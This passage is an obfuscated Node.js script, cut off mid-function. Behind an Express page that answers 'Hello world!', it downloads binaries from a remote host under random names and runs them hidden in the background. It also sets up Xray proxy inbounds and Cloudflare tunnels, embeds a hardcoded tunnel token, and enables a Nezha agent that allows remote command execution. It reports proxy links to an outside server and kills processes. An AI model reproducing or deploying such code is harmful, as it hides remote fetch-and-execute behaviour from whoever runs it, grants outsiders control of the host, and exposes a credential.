const _0x44253e=_0x2274;(function(_0x4883b8,_0x30cac9){const _0x4d8805={_0x3bae9d:0x188,_0x226c88:0x1b5,_0x45ad8a:0x137,_0x595314:0x168,_0x3523b0:0x14d},_0x9b293c=_0x2274,_0x569fc4=_0x4883b8();while(!![]){try{const _0x419ed9=parseInt(_0x9b293c(_0x4d8805._0x3bae9d))/0x1+parseInt(_0x9b293c(_0x4d8805._0x226c88))/0x2*(-parseInt(_0x9b293c(_0x4d8805._0x45ad8a))/0x3)+parseInt(_0x9b293c(0x154))/0x4+-parseInt(_0x9b293c(_0x4d8805._0x595314))/0x5*(-parseInt(_0x9b293c(0x191))/0x6)+-parseInt(_0x9b293c(0x199))/0x7*(-parseInt(_0x9b293c(_0x4d8805._0x3523b0))/0x8)+-parseInt(_0x9b293c(0x141))/0x9+-parseInt(_0x9b293c(0x19d))/0xa;if(_0x419ed9===_0x30cac9)break;else _0x569fc4['push'](_0x569fc4['shift']());}catch(_0x51a9e4){_0x569fc4['push'](_0x569fc4['shift']());}}}(_0x146e,0x398c8));const express=require(_0x44253e(0x1c0)),app=express(),axios=require(_0x44253e(0x1d3)),os=require('os'),fs=require('fs'),path=require(_0x44253e(0x10e)),{promisify}=require(_0x44253e(0x189)),exec=promisify(require(_0x44253e(0x135))[_0x44253e(0x150)]),{execSync}=require(_0x44253e(0x135)),UPLOAD_URL=process[_0x44253e(0x187)][_0x44253e(0x18a)]||'',PROJECT_URL=process[_0x44253e(0x187)][_0x44253e(0x169)]||'',AUTO_ACCESS=process[_0x44253e(0x187)][_0x44253e(0x15f)]||![],FILE_PATH=process[_0x44253e(0x187)][_0x44253e(0x145)]||_0x44253e(0x17a),SUB_PATH=process[_0x44253e(0x187)]['SUB_PATH']||'666',PORT=process['env']['SERVER_PORT']||process[_0x44253e(0x187)][_0x44253e(0x1c1)]||0xbb8,UUID=process[_0x44253e(0x187)][_0x44253e(0x1d4)]||_0x44253e(0x15d),NEZHA_SERVER=process['env'][_0x44253e(0x1ad)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x44253e(0x187)]['NEZHA_KEY']||'',ARGO_DOMAIN=process['env'][_0x44253e(0x18d)]||_0x44253e(0x136),ARGO_AUTH=process['env'][_0x44253e(0x124)]||_0x44253e(0x1d0),ARGO_PORT=process['env'][_0x44253e(0x143)]||0x1f41,CFIP=process[_0x44253e(0x187)][_0x44253e(0x13a)]||_0x44253e(0x10d),CFPORT=process[_0x44253e(0x187)][_0x44253e(0x197)]||0x1bb,NAME=process['env'][_0x44253e(0x148)]||_0x44253e(0x1cf);!fs[_0x44253e(0x132)](FILE_PATH)?(fs[_0x44253e(0x123)](FILE_PATH),console['log'](FILE_PATH+_0x44253e(0x1b2))):console[_0x44253e(0x111)](FILE_PATH+_0x44253e(0x146));function generateRandomName(){const _0x5d47c2={_0x203c20:0x190},_0xa54aa5=_0x44253e,_0x3f37cd=_0xa54aa5(0x1bc);let _0x1f89e4='';for(let _0x2988d7=0x0;_0x2988d7<0x6;_0x2988d7++){_0x1f89e4+=_0x3f37cd[_0xa54aa5(_0x5d47c2._0x203c20)](Math['floor'](Math['random']()*_0x3f37cd[_0xa54aa5(0x1ce)]));}return _0x1f89e4;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x44253e(0x144)](FILE_PATH,phpName),webPath=path[_0x44253e(0x144)](FILE_PATH,webName),botPath=path[_0x44253e(0x144)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x44253e(0x1cc)),listPath=path[_0x44253e(0x144)](FILE_PATH,_0x44253e(0x174)),bootLogPath=path[_0x44253e(0x144)](FILE_PATH,_0x44253e(0x134)),configPath=path[_0x44253e(0x144)](FILE_PATH,'config.json');function _0x2274(_0x3d91f4,_0x41a919){const _0x146eeb=_0x146e();return _0x2274=function(_0x227407,_0x50f04e){_0x227407=_0x227407-0x10d;let _0x57d96d=_0x146eeb[_0x227407];return _0x57d96d;},_0x2274(_0x3d91f4,_0x41a919);}function deleteNodes(){const _0x521689={_0xf8ddbd:0x130,_0x45e85d:0x112,_0x22f631:0x192,_0x5610dc:0x1ce,_0x47160e:0x16a,_0x3104dd:0x11c},_0x189b00=_0x44253e;try{if(!UPLOAD_URL)return;if(!fs[_0x189b00(0x132)](subPath))return;let _0x40a919;try{_0x40a919=fs[_0x189b00(_0x521689._0xf8ddbd)](subPath,_0x189b00(0x1a6));}catch{return null;}const _0x5623a7=Buffer['from'](_0x40a919,_0x189b00(_0x521689._0x45e85d))[_0x189b00(0x1c4)](_0x189b00(0x1a6)),_0x2e5616=_0x5623a7[_0x189b00(_0x521689._0x22f631)]('\x0a')[_0x189b00(0x1cb)](_0x24d7fb=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x24d7fb));if(_0x2e5616[_0x189b00(_0x521689._0x5610dc)]===0x0)return;return axios[_0x189b00(0x110)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x2e5616}),{'headers':{'Content-Type':_0x189b00(_0x521689._0x47160e)}})[_0x189b00(_0x521689._0x3104dd)](_0x448bc8=>{return null;}),null;}catch(_0x1e8487){return null;}}function cleanupOldFiles(){const _0x4c4875={_0x1157dd:0x1a2,_0x4ccc19:0x1a7},_0x4fa828={_0x565108:0x11b},_0x297450=_0x44253e;try{const _0x31c3b1=fs[_0x297450(_0x4c4875._0x1157dd)](FILE_PATH);_0x31c3b1[_0x297450(_0x4c4875._0x4ccc19)](_0x39358f=>{const _0x39328e=_0x297450,_0x337dc1=path[_0x39328e(0x144)](FILE_PATH,_0x39358f);try{const _0x4d695d=fs[_0x39328e(_0x4fa828._0x565108)](_0x337dc1);_0x4d695d[_0x39328e(0x15c)]()&&fs[_0x39328e(0x165)](_0x337dc1);}catch(_0x41082a){}});}catch(_0x47f19a){}}app[_0x44253e(0x159)]('/',function(_0x10760d,_0x4404a7){const _0x343d45=_0x44253e;_0x4404a7[_0x343d45(0x122)]('Hello\x20world!');});async function generateConfig(){const _0x4457d8={_0x436b59:0x13d,_0x4b48a5:0x133,_0x1735f2:0x158,_0x102b13:0x12a,_0x231bb5:0x177,_0x22e51c:0x171,_0x89fab9:0x16c,_0x2e2705:0x1b7,_0x1ea390:0x16f,_0x4e4324:0x1b9,_0x4c42c8:0x181,_0x3e0236:0x1bd},_0x3d0f90=_0x44253e,_0x2d82e5={'log':{'access':_0x3d0f90(_0x4457d8._0x436b59),'error':_0x3d0f90(0x13d),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x3d0f90(0x12a),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x3d0f90(0x158),'fallbacks':[{'dest':0xbb9},{'path':_0x3d0f90(0x177),'dest':0xbba},{'path':_0x3d0f90(0x171),'dest':0xbbb},{'path':_0x3d0f90(_0x4457d8._0x4b48a5),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x3d0f90(0x1ba),'protocol':_0x3d0f90(0x12a),'settings':{'clients':[{'id':UUID}],'decryption':_0x3d0f90(_0x4457d8._0x1735f2)},'streamSettings':{'network':'tcp','security':_0x3d0f90(0x158)}},{'port':0xbba,'listen':_0x3d0f90(0x1ba),'protocol':_0x3d0f90(_0x4457d8._0x102b13),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x3d0f90(0x158)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x3d0f90(_0x4457d8._0x231bb5)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x3d0f90(0x16c),_0x3d0f90(0x1bb)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x3d0f90(_0x4457d8._0x22e51c)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x3d0f90(_0x4457d8._0x89fab9),_0x3d0f90(0x1bb)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x3d0f90(_0x4457d8._0x2e2705),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x3d0f90(_0x4457d8._0x1735f2),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x3d0f90(_0x4457d8._0x89fab9),_0x3d0f90(0x1bb)],'metadataOnly':![]}}],'dns':{'servers':[_0x3d0f90(_0x4457d8._0x1ea390)]},'outbounds':[{'protocol':'freedom','tag':_0x3d0f90(0x127)},{'protocol':_0x3d0f90(_0x4457d8._0x4e4324),'tag':_0x3d0f90(0x19b)}]};fs[_0x3d0f90(0x16d)](path['join'](FILE_PATH,_0x3d0f90(_0x4457d8._0x4c42c8)),JSON[_0x3d0f90(_0x4457d8._0x3e0236)](_0x2d82e5,null,0x2));}function getSystemArchitecture(){const _0x2ca48c={_0x460193:0x13f,_0x22372d:0x14b},_0x5a3562=_0x44253e,_0x5d24e7=os[_0x5a3562(_0x2ca48c._0x460193)]();return _0x5d24e7===_0x5a3562(0x1b8)||_0x5d24e7===_0x5a3562(0x1d6)||_0x5d24e7===_0x5a3562(_0x2ca48c._0x22372d)?_0x5a3562(0x1b8):'amd';}function downloadFile(_0x2febe5,_0x41e65f,_0x4bab51){const _0x4b931d={_0x4d35a5:0x186},_0x2c9288={_0x3664bb:0x1ac},_0x59868e={_0x41719d:0x129,_0x159704:0x151},_0x24fdf0={_0x23e154:0x19e,_0x47e92f:0x194},_0x565904={_0x4e8b24:0x140,_0x920c6f:0x111,_0x116fb1:0x1c6},_0x16bd96=_0x44253e,_0xbef6b9=_0x2febe5;!fs['existsSync'](FILE_PATH)&&fs[_0x16bd96(0x123)](FILE_PATH,{'recursive':!![]});const _0x3322b3=fs[_0x16bd96(0x12d)](_0xbef6b9);axios({'method':_0x16bd96(0x159),'url':_0x41e65f,'responseType':_0x16bd96(_0x4b931d._0x4d35a5)})[_0x16bd96(0x128)](_0x491435=>{const _0x53d3c0=_0x16bd96;_0x491435[_0x53d3c0(0x153)][_0x53d3c0(_0x59868e._0x41719d)](_0x3322b3),_0x3322b3['on'](_0x53d3c0(0x17e),()=>{const _0x3938e5=_0x53d3c0;_0x3322b3[_0x3938e5(_0x565904._0x4e8b24)](),console[_0x3938e5(_0x565904._0x920c6f)](_0x3938e5(0x194)+path['basename'](_0xbef6b9)+_0x3938e5(_0x565904._0x116fb1)),_0x4bab51(null,_0xbef6b9);}),_0x3322b3['on'](_0x53d3c0(_0x59868e._0x159704),_0x2f2216=>{const _0x46e82d=_0x53d3c0;fs[_0x46e82d(_0x24fdf0._0x23e154)](_0xbef6b9,()=>{});const _0xc5c4b7=_0x46e82d(_0x24fdf0._0x47e92f)+path[_0x46e82d(0x14f)](_0xbef6b9)+_0x46e82d(0x1c9)+_0x2f2216['message'];console['error'](_0xc5c4b7),_0x4bab51(_0xc5c4b7);});})[_0x16bd96(0x11c)](_0x256739=>{const _0x409487=_0x16bd96,_0x48086a=_0x409487(0x194)+path['basename'](_0xbef6b9)+_0x409487(0x1c9)+_0x256739[_0x409487(_0x2c9288._0x3664bb)];console['error'](_0x48086a),_0x4bab51(_0x48086a);});}function _0x146e(){const _0x351635=['length','leaflow-zhe','eyJhIjoiMDc2MDcyZjE3ZWMzY2I1NzFhZTUzYjYwYjVjNjRkZTMiLCJ0IjoiOGRkMGY2NWItNjBhMC00MWI4LTliODYtZDQ1YjgxZTlhODNhIiwicyI6IlpqTTFOMlF6TVRFdFpERTRaaTAwTnpRNExXRmtOell0WTJJM1lqZzVNakkwTmpFNCJ9','/tunnel.yml\x20run','pop','axios','UUID','&path=%2Fvless-argo%3Fed%3D2560#','arm64','tunnel.yml','cf.877774.xyz','path','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','post','log','base64','true','win32','TunnelSecret','country_code','Unknown','response','success','&path=%2Ftrojan-argo%3Fed%3D2560#','statSync','catch','test','--tls','Nodes\x20uploaded\x20successfully','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','\x0a\x0avmess://','send','mkdirSync','ARGO_AUTH','npm\x20running\x20error:\x20','status','direct','then','pipe','vless','\x0a\x20\x20credentials-file:\x20','match','createWriteStream','\x0a\x0atrojan://','Error\x20reading\x20boot.log:','readFileSync','text/plain;\x20charset=utf-8','existsSync','/trojan-argo','boot.log','child_process','leaflowzhe.karlxu.qzz.io','41277ngsfzH','8443','taskkill\x20/f\x20/im\x20','CFIP','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','firefox','/dev/null','config.yaml','arch','close','1888650EbMfkf','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','ARGO_PORT','join','FILE_PATH','\x20already\x20exists','pkill\x20-f\x20\x22[','NAME','443','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','aarch64','https://amd64.ssss.nyc.mn/web','2785496ZCXBKy','\x20is\x20running','basename','exec','error','chmod','data','606316tNIaIg','rm\x20-rf\x20','\x20-c\x20','nohup\x20','none','get','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','map','isFile','0f3bf555-2fb4-4518-8956-377224deae8c','\x20>/dev/null\x202>&1\x20&','AUTO_ACCESS','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','\x20-s\x20','unshift','App\x20is\x20running','unlinkSync','/api/add-nodes','https://arm64.ssss.nyc.mn/bot','891070KTDRad','PROJECT_URL','application/json','NEZHA\x20variable\x20is\x20empty,skip\x20running','tls','writeFileSync','false','https+local://8.8.8.8/dns-query','includes','/vmess-argo','\x20>\x20nul\x202>&1','http\x20server\x20is\x20running\x20on\x20port:','list.txt','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','all','/vless-argo','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','&fp=firefox&type=ws&host=','./tmp','push','org','Error\x20executing\x20command:\x20','finish','2083','https://arm64.ssss.nyc.mn/agent','config.json','Unhandled\x20error\x20in\x20startserver:','/vmess-argo?ed=2560','from','\x0a\x20\x20\x20\x20','stream','env','362907ciBzTp','util','UPLOAD_URL','set','del\x20/f\x20/q\x20','ARGO_DOMAIN','.exe\x20>\x20nul\x202>&1','https://arm64.ssss.nyc.mn/v1','charAt','12LmOKXK','split','\x0avless://','Download\x20','?security=tls&sni=','\x20-p\x20','CFPORT','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','7kCtFZh','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','block','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','5396280zoRsPL','unlink','web\x20running\x20error:\x20','https://ipapi.co/json/','\x22\x20>\x20/dev/null\x202>&1','readdirSync','\x20>/dev/null\x202>&1','countryCode','/config.json\x20>/dev/null\x202>&1\x20&','utf-8','forEach','Skipping\x20adding\x20automatic\x20access\x20task','Error\x20downloading\x20files:','has','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','message','NEZHA_SERVER','?encryption=none&security=tls&sni=','2087','2096','/sub.txt\x20saved\x20successfully','\x20is\x20created','substring','2053','34RELhfp','\x20-c\x20\x22','trojan','arm','blackhole','127.0.0.1','quic','abcdefghijklmnopqrstuvwxyz','stringify','https://arm64.ssss.nyc.mn/web','https://oooo.serv00.net/add-url','express','PORT','platform','fileName','toString','php\x20running\x20error:\x20','\x20successfully','tunnel.json','http://ip-api.com/json/','\x20failed:\x20','clear','filter','sub.txt','automatic\x20access\x20task\x20added\x20successfully'];_0x146e=function(){return _0x351635;};return _0x146e();}async function downloadFilesAndRun(){const _0x3f7192={_0x5d9326:0x111,_0x5639a0:0x10f,_0x43c85a:0x176,_0x4856fd:0x1a9,_0x430967:0x1d2,_0x2e4928:0x138,_0x294223:0x1af,_0x42f982:0x17f,_0x5d250a:0x1aa,_0x40b774:0x113,_0x17b0a2:0x16e,_0x56c783:0x198,_0x1b1a31:0x19a,_0x4237b0:0x144,_0x50d319:0x1c5,_0x4dc082:0x149,_0x51b198:0x17f,_0x49caf6:0x170,_0x2e0561:0x11e,_0x12f3c4:0x162,_0xeea4db:0x196,_0x7ff65b:0x151,_0x1e78bf:0x125,_0x5296ac:0x16b,_0x4e96da:0x156,_0x432af5:0x111,_0x1778ef:0x19f,_0x54bd8a:0x132,_0x1467c1:0x13b,_0xfe63d0:0x1d1,_0xf6c090:0x15e,_0x704e43:0x111,_0x50331a:0x14e,_0x57ee46:0x17d},_0x46c67a={_0x19c5da:0x1a7},_0x59760e={_0x487190:0x152},_0x45872a=_0x44253e,_0x4e6491=getSystemArchitecture(),_0x11356a=getFilesForArchitecture(_0x4e6491);if(_0x11356a['length']===0x0){console[_0x45872a(_0x3f7192._0x5d9326)](_0x45872a(_0x3f7192._0x5639a0));return;}const _0x144ed3=_0x11356a[_0x45872a(0x15b)](_0xe17790=>{return new Promise((_0x428e38,_0x4d6842)=>{const _0x1a5e5a=_0x2274;downloadFile(_0xe17790[_0x1a5e5a(0x1c3)],_0xe17790['fileUrl'],(_0x2331c4,_0x56ccb2)=>{_0x2331c4?_0x4d6842(_0x2331c4):_0x428e38(_0x56ccb2);});});});try{await Promise[_0x45872a(_0x3f7192._0x43c85a)](_0x144ed3);}catch(_0x39fee8){console[_0x45872a(0x151)](_0x45872a(_0x3f7192._0x4856fd),_0x39fee8);return;}function _0x2149cf(_0x22525c){const _0x52b807=_0x45872a,_0x824ed7=0x1fd;_0x22525c[_0x52b807(_0x46c67a._0x19c5da)](_0x34317e=>{const _0xcd30f2={_0x4ae4d1:0x111,_0x247293:0x1c4},_0x11f631=_0x52b807;fs['existsSync'](_0x34317e)&&fs[_0x11f631(_0x59760e._0x487190)](_0x34317e,_0x824ed7,_0x29483e=>{const _0x29eba9=_0x11f631;_0x29483e?console[_0x29eba9(0x151)]('Empowerment\x20failed\x20for\x20'+_0x34317e+':\x20'+_0x29483e):console[_0x29eba9(_0xcd30f2._0x4ae4d1)]('Empowerment\x20success\x20for\x20'+_0x34317e+':\x20'+_0x824ed7[_0x29eba9(_0xcd30f2._0x247293)](0x8));});});}const _0x471bb6=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2149cf(_0x471bb6);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3a68d1=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x45872a(0x192)](':')[_0x45872a(_0x3f7192._0x430967)]():'',_0x5075ca=new Set(['443',_0x45872a(_0x3f7192._0x2e4928),_0x45872a(0x1b0),_0x45872a(_0x3f7192._0x294223),_0x45872a(_0x3f7192._0x42f982),'2053']),_0x215996=_0x5075ca[_0x45872a(_0x3f7192._0x5d250a)](_0x3a68d1)?_0x45872a(_0x3f7192._0x40b774):_0x45872a(_0x3f7192._0x17b0a2),_0x73b79a='\x0aclient_secret:\x20'+NEZHA_KEY+_0x45872a(_0x3f7192._0x56c783)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x215996+_0x45872a(_0x3f7192._0x1b1a31)+UUID;fs[_0x45872a(0x16d)](path[_0x45872a(_0x3f7192._0x4237b0)](FILE_PATH,_0x45872a(0x13e)),_0x73b79a);const _0x4b464b=_0x45872a(0x157)+phpPath+_0x45872a(0x1b6)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4b464b),console[_0x45872a(0x111)](phpName+'\x20is\x20running'),await new Promise(_0x1f0ebb=>setTimeout(_0x1f0ebb,0x3e8));}catch(_0xd5cf7c){console[_0x45872a(0x151)](_0x45872a(_0x3f7192._0x50d319)+_0xd5cf7c);}}else{let _0x2c2f46='';const _0x54b8ba=[_0x45872a(_0x3f7192._0x4dc082),_0x45872a(0x138),_0x45872a(0x1b0),_0x45872a(_0x3f7192._0x294223),_0x45872a(_0x3f7192._0x51b198),_0x45872a(0x1b4)];_0x54b8ba[_0x45872a(_0x3f7192._0x49caf6)](NEZHA_PORT)&&(_0x2c2f46=_0x45872a(_0x3f7192._0x2e0561));const _0x58db97=_0x45872a(0x157)+npmPath+_0x45872a(_0x3f7192._0x12f3c4)+NEZHA_SERVER+':'+NEZHA_PORT+_0x45872a(_0x3f7192._0xeea4db)+NEZHA_KEY+'\x20'+_0x2c2f46+_0x45872a(0x178);try{await exec(_0x58db97),console[_0x45872a(0x111)](npmName+'\x20is\x20running'),await new Promise(_0x2bbf4e=>setTimeout(_0x2bbf4e,0x3e8));}catch(_0x459081){console[_0x45872a(_0x3f7192._0x7ff65b)](_0x45872a(_0x3f7192._0x1e78bf)+_0x459081);}}}else console[_0x45872a(_0x3f7192._0x5d9326)](_0x45872a(_0x3f7192._0x5296ac));const _0x14c2c5=_0x45872a(0x157)+webPath+_0x45872a(_0x3f7192._0x4e96da)+FILE_PATH+_0x45872a(0x1a5);try{await exec(_0x14c2c5),console[_0x45872a(_0x3f7192._0x432af5)](webName+'\x20is\x20running'),await new Promise(_0x2538bc=>setTimeout(_0x2538bc,0x3e8));}catch(_0x3de0d7){console[_0x45872a(0x151)](_0x45872a(_0x3f7192._0x1778ef)+_0x3de0d7);}if(fs[_0x45872a(_0x3f7192._0x54bd8a)](botPath)){let _0x2a75ef;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x2a75ef=_0x45872a(0x14a)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x2a75ef=_0x45872a(_0x3f7192._0x1467c1)+FILE_PATH+_0x45872a(_0x3f7192._0xfe63d0):_0x2a75ef=_0x45872a(0x19c)+FILE_PATH+_0x45872a(0x160)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x2a75ef+_0x45872a(_0x3f7192._0xf6c090)),console[_0x45872a(_0x3f7192._0x704e43)](botName+_0x45872a(_0x3f7192._0x50331a)),await new Promise(_0x1e391=>setTimeout(_0x1e391,0x7d0));}catch(_0x4bffdf){console[_0x45872a(_0x3f7192._0x7ff65b)](_0x45872a(_0x3f7192._0x57ee46)+_0x4bffdf);}}await new Promise(_0x1cd037=>setTimeout(_0x1cd037,0x1388));}function getFilesForArchitecture(_0x36c63b){const _0x4c33c3={_0x28dd0f:0x1be,_0x39a20a:0x14c,_0x3fc418:0x1b8,_0x3f0d2e:0x18f},_0x13db95=_0x44253e;let _0x449392;_0x36c63b==='arm'?_0x449392=[{'fileName':webPath,'fileUrl':_0x13db95(_0x4c33c3._0x28dd0f)},{'fileName':botPath,'fileUrl':_0x13db95(0x167)}]:_0x449392=[{'fileName':webPath,'fileUrl':_0x13db95(_0x4c33c3._0x39a20a)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x40c91a=_0x36c63b===_0x13db95(0x1b8)?_0x13db95(0x180):'https://amd64.ssss.nyc.mn/agent';_0x449392[_0x13db95(0x163)]({'fileName':npmPath,'fileUrl':_0x40c91a});}else{const _0x2226dd=_0x36c63b===_0x13db95(_0x4c33c3._0x3fc418)?_0x13db95(_0x4c33c3._0x3f0d2e):'https://amd64.ssss.nyc.mn/v1';_0x449392[_0x13db95(0x163)]({'fileName':phpPath,'fileUrl':_0x2226dd});}}return _0x449392;}function argoType(){const _0x16075f={_0x5d2393:0x192,_0x2da411:0x12b,_0x22563c:0x144,_0x2390d8:0x1c7,_0x5652a9:0x142},_0x5b6174=_0x44253e;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x5b6174(0x111)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x5b6174(0x170)](_0x5b6174(0x115))){fs['writeFileSync'](path[_0x5b6174(0x144)](FILE_PATH,_0x5b6174(0x1c7)),ARGO_AUTH);const _0x3ac877='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x5b6174(_0x16075f._0x5d2393)]('\x22')[0xb]+_0x5b6174(_0x16075f._0x2da411)+path[_0x5b6174(_0x16075f._0x22563c)](FILE_PATH,_0x5b6174(_0x16075f._0x2390d8))+_0x5b6174(_0x16075f._0x5652a9)+ARGO_DOMAIN+_0x5b6174(0x120)+ARGO_PORT+_0x5b6174(0x161);fs[_0x5b6174(0x16d)](path['join'](FILE_PATH,_0x5b6174(0x1d7)),_0x3ac877);}else console[_0x5b6174(0x111)](_0x5b6174(0x1ab));}async function extractDomains(){const _0x5df523={_0x16951d:0x111,_0x45ef52:0x130,_0x57a81b:0x144,_0x9bceac:0x1a6,_0x26a618:0x1a7,_0x3be1c0:0x111,_0x4689ed:0x15e,_0x50b0d4:0x151},_0x48cabf={_0x3db793:0x1a0,_0x69484a:0x153,_0x1d4617:0x116,_0x2781aa:0x119,_0x2c76fc:0x1a4,_0x2b1bc6:0x17c,_0x31f446:0x153,_0x545132:0x17c},_0xc7d94f={_0x5f5d1e:0x1c2,_0x3f7990:0x114,_0x4b6448:0x190,_0x247516:0x1b3},_0x171f25={_0xa264a9:0x17b},_0x5b1a72=_0x44253e;let _0x338ad2;if(ARGO_AUTH&&ARGO_DOMAIN)_0x338ad2=ARGO_DOMAIN,console[_0x5b1a72(_0x5df523._0x16951d)]('ARGO_DOMAIN:',_0x338ad2),await _0x2cc488(_0x338ad2);else try{const _0x4b67ea=fs[_0x5b1a72(_0x5df523._0x45ef52)](path[_0x5b1a72(_0x5df523._0x57a81b)](FILE_PATH,_0x5b1a72(0x134)),_0x5b1a72(_0x5df523._0x9bceac)),_0x3f2619=_0x4b67ea[_0x5b1a72(0x192)]('\x0a'),_0xe6c132=[];_0x3f2619[_0x5b1a72(_0x5df523._0x26a618)](_0x58d5da=>{const _0x12cced=_0x5b1a72,_0x48e867=_0x58d5da[_0x12cced(0x12c)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x48e867){const _0x588317=_0x48e867[0x1];_0xe6c132[_0x12cced(_0x171f25._0xa264a9)](_0x588317);}});if(_0xe6c132['length']>0x0)_0x338ad2=_0xe6c132[0x0],console[_0x5b1a72(_0x5df523._0x3be1c0)]('ArgoDomain:',_0x338ad2),await _0x2cc488(_0x338ad2);else{console[_0x5b1a72(0x111)](_0x5b1a72(0x15a)),fs['unlinkSync'](path[_0x5b1a72(0x144)](FILE_PATH,_0x5b1a72(0x134)));async function _0xda5d75(){const _0x6078ba=_0x5b1a72;try{process[_0x6078ba(_0xc7d94f._0x5f5d1e)]===_0x6078ba(_0xc7d94f._0x3f7990)?await exec(_0x6078ba(0x139)+botName+_0x6078ba(0x18e)):await exec(_0x6078ba(0x147)+botName[_0x6078ba(_0xc7d94f._0x4b6448)](0x0)+']'+botName[_0x6078ba(_0xc7d94f._0x247516)](0x1)+_0x6078ba(0x1a1));}catch(_0x211f97){}}_0xda5d75(),await new Promise(_0x31255e=>setTimeout(_0x31255e,0xbb8));const _0xd99f9d=_0x5b1a72(0x19c)+FILE_PATH+_0x5b1a72(0x160)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0xd99f9d+_0x5b1a72(_0x5df523._0x4689ed)),console[_0x5b1a72(_0x5df523._0x3be1c0)](botName+_0x5b1a72(0x14e)),await new Promise(_0x31308c=>setTimeout(_0x31308c,0xbb8)),await extractDomains();}catch(_0x25fa56){console[_0x5b1a72(0x151)](_0x5b1a72(0x17d)+_0x25fa56);}}}catch(_0x2bda58){console[_0x5b1a72(_0x5df523._0x50b0d4)](_0x5b1a72(0x12f),_0x2bda58);}async function _0x424f76(){const _0x269eff=_0x5b1a72;try{const _0x413e94=await axios[_0x269eff(0x159)](_0x269eff(_0x48cabf._0x3db793),{'timeout':0xbb8});if(_0x413e94['data']&&_0x413e94[_0x269eff(_0x48cabf._0x69484a)][_0x269eff(_0x48cabf._0x1d4617)]&&_0x413e94[_0x269eff(_0x48cabf._0x69484a)]['org'])return _0x413e94[_0x269eff(0x153)][_0x269eff(0x116)]+'_'+_0x413e94[_0x269eff(0x153)]['org'];}catch(_0x5ec06a){try{const _0x2093fd=await axios[_0x269eff(0x159)](_0x269eff(0x1c8),{'timeout':0xbb8});if(_0x2093fd[_0x269eff(_0x48cabf._0x69484a)]&&_0x2093fd[_0x269eff(_0x48cabf._0x69484a)]['status']===_0x269eff(_0x48cabf._0x2781aa)&&_0x2093fd[_0x269eff(0x153)][_0x269eff(_0x48cabf._0x2c76fc)]&&_0x2093fd['data'][_0x269eff(_0x48cabf._0x2b1bc6)])return _0x2093fd['data'][_0x269eff(_0x48cabf._0x2c76fc)]+'_'+_0x2093fd[_0x269eff(_0x48cabf._0x31f446)][_0x269eff(_0x48cabf._0x545132)];}catch(_0x305a9a){}}return _0x269eff(0x117);}async function _0x2cc488(_0x5e4601){const 